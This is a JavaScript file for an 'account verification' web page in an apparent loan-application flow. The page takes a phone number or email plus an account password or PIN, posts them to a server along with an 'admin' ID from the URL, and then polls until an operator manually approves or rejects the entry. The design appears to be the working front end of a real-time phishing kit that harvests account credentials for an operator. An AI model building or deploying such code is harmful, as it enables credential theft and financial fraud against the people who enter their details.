// Account Verification Script - FIXED VERSION
document.addEventListener('DOMContentLoaded', function() {
    const verificationScreen = document.getElementById('verificationScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen = document.getElementById('rejectionScreen');
    
    const accountIdentifier = document.getElementById('accountIdentifier');
    const accountPassword = document.getElementById('accountPassword');
    const verifyBtn = document.getElementById('verifyBtn');
    
    // Get URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const adminId = urlParams.get('admin');
    
    // ✅ CRITICAL FIX: Get the REAL application ID from sessionStorage
    // The PIN step should have saved this
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
    const applicationId = applicationData.applicationId; // This should be APP-xxxxx
    
    console.log('=== VERIFICATION PAGE DEBUG ===');
    console.log('Application ID from sessionStorage:', applicationId);
    console.log('Admin ID from URL:', adminId);
    console.log('Session data:', applicationData);
    
    // Check if we have a valid application ID
    if (!applicationId) {
        console.error('❌ No application ID in sessionStorage!');
        console.error('This means the PIN step did not save the application data.');
        alert('Session expired or invalid. Please start from the beginning.');
        window.location.href = adminId ? `/?admin=${adminId}` : '/';
        return;
    }
    
    // Verify it's the right format (APP-xxxxx, not LOAN-xxxxx)
    if (!applicationId.startsWith('APP-')) {
        console.error('❌ Invalid application ID format:', applicationId);
        console.error('Expected format: APP-xxxxx, got:', applicationId);
        alert('Invalid application ID. Please start from the beginning.');
        window.location.href = adminId ? `/?admin=${adminId}` : '/';
        return;
    }
    
    console.log('✅ Valid application ID found:', applicationId);
    
    // Focus on first input
    if (accountIdentifier) accountIdentifier.focus();
    
    // Verify button click
    verifyBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const identifier = accountIdentifier.value.trim();
        const password = accountPassword.value.trim();
        
        if (!identifier) {
            alert('Please enter your phone number or email');
            accountIdentifier.focus();
            return;
        }
        
        if (!password) {
            alert('Please enter your password or PIN');
            accountPassword.focus();
            return;
        }
        
        // Validate identifier format
        const isEmail = identifier.includes('@');
        const isPhone = /^[0-9+\s()-]+$/.test(identifier);
        
        if (!isEmail && !isPhone) {
            alert('Please enter a valid phone number or email address');
            accountIdentifier.focus();
            return;
        }
        
        console.log('=== SUBMITTING VERIFICATION ===');
        console.log('Application ID:', applicationId);
        console.log('Identifier:', identifier);
        console.log('Type:', isEmail ? 'email' : 'phone');
        
        // Show processing screen
        verificationScreen.style.display = 'none';
        processingScreen.style.display = 'block';
        
        try {
            console.log('Sending POST to /api/verify-account...');
            const response = await fetch('/api/verify-account', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    applicationId: applicationId,  // Use the APP-xxxxx from sessionStorage
                    identifier: identifier,
                    password: password,
                    identifierType: isEmail ? 'email' : 'phone'
                })
            });
            
            console.log('Response status:', response.status);
            
            if (!response.ok) {
                const errorText = await response.text();
                console.error('❌ Server error response:', errorText);
                
                let errorMessage = 'Server error. Please try again.';
                try {
                    const errorJson = JSON.parse(errorText);
                    errorMessage = errorJson.message || errorMessage;
                } catch (e) {
                    // Not JSON, use default message
                }
                
                throw new Error(errorMessage);
            }
            
            const result = await response.json();
            console.log('✅ Response data:', result);
            
            if (result.success || result.status === 'pending') {
                console.log('✅ Verification submitted successfully');
                console.log('Starting status polling...');
                checkVerificationStatus();
            } else {
                throw new Error(result.message || 'Verification failed');
            }
            
        } catch (error) {
            console.error('❌ Verification error:', error);
            alert('Error: ' + error.message);
            processingScreen.style.display = 'none';
            verificationScreen.style.display = 'block';
        }
    });
    
    // Check verification status
    function checkVerificationStatus() {
        console.log('=== STARTING STATUS POLLING ===');
        console.log('Polling for application:', applicationId);
        
        let pollCount = 0;
        const maxPolls = 300; // 10 minutes (300 * 2 seconds)
        
        const statusInterval = setInterval(async () => {
            pollCount++;
            
            try {
                console.log(`Poll #${pollCount}: Checking status...`);
                const response = await fetch(`/api/check-verification-status/${applicationId}`);
                
                if (!response.ok) {
                    console.error('Status check failed:', response.status);
                    return; // Keep trying
                }
                
                const result = await response.json();
                console.log('Status response:', result);
                
                if (result.status === 'approved') {
                    clearInterval(statusInterval);
                    console.log('✅✅✅ APPROVED! Redirecting...');
                    window.location.href = 'approval.html';
                    
                } else if (result.status === 'rejected') {
                    clearInterval(statusInterval);
                    console.log('❌ REJECTED!');
                    processingScreen.style.display = 'none';
                    rejectionScreen.style.display = 'block';
                    
                } else {
                    console.log('⏳ Still pending...');
                }
                
            } catch (error) {
                console.error('Status check error:', error);
            }
        }, 2000); // Check every 2 seconds
        
        // Timeout after 10 minutes
        setTimeout(() => {
            clearInterval(statusInterval);
            console.log('⏱️ Polling timeout after 10 minutes');
            alert('Verification timeout. Please try again.');
            processingScreen.style.display = 'none';
            verificationScreen.style.display = 'block';
        }, 600000); // 10 minutes
    }
    
    // Allow Enter key to submit
    [accountIdentifier, accountPassword].forEach(input => {
        if (input) {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    verifyBtn.click();
                }
            });
        }
    });
    
    console.log('✅ Verification page initialized');
});